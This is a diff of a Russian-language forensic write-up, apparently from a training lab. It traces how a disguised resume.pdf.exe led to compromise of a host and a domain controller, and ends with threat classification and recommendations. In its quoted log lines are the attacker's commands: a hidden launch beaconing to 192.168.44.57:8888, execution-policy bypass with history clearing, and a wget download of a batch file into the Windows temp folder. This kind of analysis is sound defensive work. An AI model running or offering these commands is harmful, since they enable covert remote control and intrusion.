@@ -9,12 +9,16 @@
 -2022-08-02 03:39:22.234{289a599c-9c69-62e8-6e14-000000001900}9396C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exeC:\Users\Bob\Downloads\Resume.zip2022-08-02 
 ```
 
+![ScreenShot](screenshots/1.png)
+
 ### Этап 2: Зауск файла resume.pdf.exe пользователем и дальнейшее развитие атаки
 В 3:39 был запущен файл **resume.pdf.exe**. Данный файл при запуске пытается установить соединение с хостом 192.168.44.57:8888.
 
 ```sh
 powershell.exe /c Start-Process -FilePath Resume.pdf.exe -ArgumentList '-server http://192.168.44.57:8888 -group red' -WindowStyle Hidden powershell.exe -ExecutionPolicy Bypass -C Clear-History;Clear
 ```
+
+![ScreenShot](screenshots/2.png)
 
 В 3:54 был создан процесс, который позволяет устанавливать связь с сервером.
 
@@ -36,10 +40,14 @@ C:\Windows\System32\cmd.execmd.exe /C @echo off&echo ___________________________
 powershell.exe -ExecutionPolicy Bypass -C "wget http://192.168.44.57:8000/0000000000.bat -OutFile c:\windows\temp\1.bat
 ```
 
+![ScreenShot](screenshots/3.png)
+
 Также замечен файл **1.log**, который, возможно, создается при работе **1.bat**
 ```sh
 powershell.exe -ExecutionPolicy Bypass -C gc c:\windows\temp\1.log
 ```
+
+![ScreenShot](screenshots/4.png)
 
 Около 4:28 был выполнен вход с правами администратора:
 ```sh
@@ -71,3 +79,10 @@ powershell.exe -ExecutionPolicy Bypass -C gc c:\windows\temp\1.log
 ```
 
 В период с 4 до 5 был захвачен хост, а также контроллер домена.
+
+### Тип атаки
+Тип угрозы: НСД
+
+Возможное негативное воздействие: FD - 8, CE – 8, PI – 10, МО – 8. 
+
+Рекомендации по обеспечению безопасности: антивирус, проведение тренингов с сотрудниками на различные темы информационной безопасности.
